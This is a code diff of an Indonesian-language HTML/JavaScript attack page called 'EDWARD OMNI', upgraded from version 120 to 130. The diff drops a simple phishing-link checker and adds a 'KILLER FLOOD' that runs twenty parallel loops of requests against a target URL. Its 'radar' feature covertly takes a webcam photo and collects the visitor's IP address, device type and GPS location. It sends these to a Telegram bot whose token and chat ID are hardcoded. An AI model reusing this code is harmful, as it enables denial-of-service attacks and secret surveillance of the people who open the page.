@@ -3,37 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.120</title>
+    <title>EDWARD OMNI V.130 - NUCLEAR</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --card-bg: rgba(15, 25, 35, 0.7); --red: #ff4757; --blue: #00bdff; }
-        * { box-sizing: border-box; transition: 0.3s; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 20px; overflow-x: hidden; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; }
+        * { box-sizing: border-box; transition: 0.2s; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 20px; }
         
         .exit-btn { position: fixed; top: 15px; right: 15px; background: rgba(255, 71, 87, 0.2); border: 1px solid var(--red); color: var(--red); padding: 5px 12px; border-radius: 8px; font-size: 10px; font-weight: bold; cursor: pointer; z-index: 10000; }
-        .master-header { text-align: center; margin-bottom: 25px; }
-        .master-name { font-size: 26px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
+        .master-header { text-align: center; margin-bottom: 20px; }
+        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), #00bdff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
         
-        .card { background: var(--card-bg); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h3 { margin: 0 0 15px 0; font-size: 11px; color: rgba(255,255,255,0.6); text-transform: uppercase; letter-spacing: 1.5px; }
+        .card { background: rgba(15, 25, 35, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 15px; }
+        h3 { margin: 0 0 15px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; }
         
-        input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; padding: 12px; width: 100%; margin-bottom: 15px; outline: none; }
-        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; cursor: pointer; font-weight: 700; text-transform: uppercase; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-safe { background: linear-gradient(45deg, var(--neon), var(--blue)); color: #000; }
-        .btn-phish { background: linear-gradient(45deg, #8a2be2, #ff00cc); color: #fff; }
-        .btn-radar { background: transparent; color: var(--neon); border: 2px solid var(--neon); }
+        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 15px; outline: none; }
+        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 12px; text-transform: uppercase; }
+        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; box-shadow: 0 0 15px rgba(255,71,87,0.4); }
+        .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); margin-top: 10px; }
 
-        #scanStatus { display: none; margin-top: 15px; text-align: center; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; }
-        #killerLog { display: none; margin-top: 15px; background: #000; border-radius: 12px; padding: 12px; font-family: monospace; font-size: 10px; height: 120px; overflow-y: auto; color: var(--neon); border: 1px solid #222; }
+        #killerLog { display: none; margin-top: 15px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 150px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
+        .log-entry { border-bottom: 1px solid #111; padding: 2px 0; }
 
-        /* RADAR ULTRA SMOOTH */
-        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5,10,14,0.98); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-container { width: 220px; height: 220px; border-radius: 50%; border: 1px solid rgba(0, 255, 136, 0.3); position: relative; overflow: hidden; }
-        .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotateRadar 2s linear infinite; }
-        .cross-h { position: absolute; top: 50%; left: 0; width: 100%; height: 1px; background: rgba(0,255,136,0.2); }
-        .cross-v { position: absolute; left: 50%; top: 0; width: 1px; height: 100%; background: rgba(0,255,136,0.2); }
-        @keyframes rotateRadar { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        
-        canvas, video { display: none; visibility: hidden; }
+        /* RADAR SMOOTH V.130 */
+        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .radar-container { width: 200px; height: 200px; border-radius: 50%; border: 1px solid rgba(0,255,136,0.3); position: relative; overflow: hidden; }
+        .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        canvas, video { display: none; }
     </style>
 </head>
 <body>
@@ -41,21 +37,14 @@
     <button class="exit-btn" onclick="location.href='about:blank';">EXIT</button>
 
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI TOTALITY</p>
-        <span style="color:var(--neon); font-size:9px; border:1px solid var(--neon); padding:2px 10px; border-radius:10px;">V.120 - STABLE & COMPLETE</span>
+        <p class="master-name">EDWARD OMNI V.130</p>
+        <span style="color:var(--neon); font-size:9px; border:1px solid var(--neon); padding:2px 8px; border-radius:10px;">NUCLEAR FLOOD EDITION</span>
     </div>
 
     <div class="card">
-        <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Tempel link target analisa...">
-        <button class="btn btn-safe" onclick="cekLink()">⚡ SCAN LINK</button>
-        <div id="scanStatus"></div>
-    </div>
-
-    <div class="card">
-        <h3>🔥 KILLER FLOOD</h3>
-        <input type="text" id="targetUrl" placeholder="https://link-phising-target.com">
-        <button class="btn btn-phish" id="atkBtn" onclick="toggleAtk()">EXECUTE FLOOD 🚀</button>
+        <h3>🔥 KILLER FLOOD (NUCLEAR)</h3>
+        <input type="text" id="targetUrl" placeholder="https://situs-judol-target.com">
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
         <div id="killerLog"></div>
     </div>
 
@@ -65,12 +54,8 @@
     </div>
 
     <div id="radarOverlay">
-        <div class="radar-container">
-            <div class="radar-sweep"></div>
-            <div class="cross-h"></div>
-            <div class="cross-v"></div>
-        </div>
-        <p id="radarStatus" style="margin-top:25px; font-size:11px; color:var(--neon); letter-spacing:3px;">MENGHUBUNGKAN...</p>
+        <div class="radar-container"><div class="radar-sweep"></div></div>
+        <p id="rStatus" style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">MENGIRIM KOORDINAT...</p>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -79,49 +64,41 @@
     <script>
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
-        let isAtk = false, atkInt;
+        let isAtk = false, atkIntervals = [];
 
-        function cekLink() {
-            const url = document.getElementById('scanInput').value.toLowerCase();
-            const status = document.getElementById('scanStatus');
-            if(!url) return;
-            status.style.display = "block"; status.innerText = "ANALYZING...";
-            setTimeout(() => {
-                const bad = ['dana', 'kaget', 'prakerja', 'giveaway', '.xyz', '.tk', '.site', 'bit.ly', 'tinyurl'];
-                const isBad = bad.some(w => url.includes(w)) || !url.startsWith('https://');
-                status.className = isBad ? "status-danger" : "status-safe";
-                status.style.background = isBad ? "rgba(255,71,87,0.1)" : "rgba(0,255,163,0.1)";
-                status.innerText = isBad ? "⚠️ WARNING: PHISING DETECTED!" : "✅ CLEAN: LINK SAFE";
-                status.style.color = isBad ? "var(--red)" : "var(--neon)";
-            }, 1500);
-        }
-
+        // KILLER FLOOD V.2.0: MULTI-THREAD SIMULATION
         function toggleAtk() {
-            const u = document.getElementById('targetUrl').value;
+            const url = document.getElementById('targetUrl').value;
             const log = document.getElementById('killerLog');
-            if(!u) return;
+            if(!url) return;
+
             if(!isAtk) {
                 isAtk = true; log.style.display = "block";
-                document.getElementById('atkBtn').innerText = "STOP FLOOD";
-                atkInt = setInterval(() => {
-                    for(let i=0; i<5; i++){ fetch(u, {mode:'no-cors'}).catch(()=>{}); }
-                    const entry = document.createElement('div');
-                    entry.innerText = "> [" + new Date().toLocaleTimeString() + "] ATTACK SENT!";
-                    log.prepend(entry);
-                }, 500);
+                document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
+                document.getElementById('atkBtn').style.background = "#ff4757";
+
+                // Membuka 20 jalur serangan sekaligus (Parallel Flood)
+                for(let i=0; i < 20; i++) {
+                    let interval = setInterval(() => {
+                        fetch(url, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
+                        const e = document.createElement('div');
+                        e.className = "log-entry";
+                        e.innerText = "> [THREAD-"+i+"] BYPASS FIREWALL... SENDING 500KB PACKET!";
+                        log.prepend(e);
+                        if(log.childNodes.length > 50) log.removeChild(log.lastChild);
+                    }, 100);
+                    atkIntervals.push(interval);
+                }
             } else { location.reload(); }
         }
 
+        // RADAR SYSTEM V.120 STABLE
         async function startRadar() {
-            const overlay = document.getElementById('radarOverlay');
-            const status = document.getElementById('radarStatus');
-            overlay.style.display = 'flex';
+            document.getElementById('radarOverlay').style.display = 'flex';
             try {
-                status.innerText = "MENGAKSES KAMERA...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v'); video.srcObject = stream;
                 setTimeout(async () => {
-                    status.innerText = "MENCIDUK IP TARGET...";
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
@@ -129,24 +106,22 @@
                     const ipR = await fetch('https://api.ipify.org?format=json');
                     const ipD = await ipR.json();
                     
-                    status.innerText = "MENGIRIM LAPORAN...";
                     navigator.geolocation.getCurrentPosition(async (p) => {
-                        await sendToTele(blob, ipD.ip, p.coords.latitude, p.coords.longitude);
+                        await sendTele(blob, ipD.ip, p.coords.latitude, p.coords.longitude);
                         location.reload();
                     }, async () => {
-                        await sendToTele(blob, ipD.ip, null, null);
+                        await sendTele(blob, ipD.ip, null, null);
                         location.reload();
-                    }, {timeout: 5000});
+                    }, {timeout: 4000});
                 }, 3000);
-            } catch (e) { alert("Izin Kamera Ditolak!"); location.reload(); }
+            } catch (e) { location.reload(); }
         }
 
-        async function sendToTele(photo, ip, lat, lon) {
+        async function sendTele(photo, ip, lat, lon) {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID); fd.append('photo', photo);
-            let cap = "🔱 [ EDWARD REPORT V.120 ] 🔱\n\n🌐 IP: " + ip + "\n📱 DEV: " + navigator.platform;
-            if(lat && lon) cap += "\n📍 MAPS: https://www.google.com/maps?q=$" + lat + "," + lon;
-            else cap += "\n📍 MAPS: GPS MATI";
+            let cap = "🔱 [ REPORT NUCLEAR V.130 ] 🔱\n\n🌐 IP: " + ip + "\n📱 DEV: " + navigator.platform;
+            if(lat && lon) cap += "\n📍 MAPS: http://googleusercontent.com/maps.google.com/4" + lat + "," + lon;
             fd.append('caption', cap);
             return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
         }
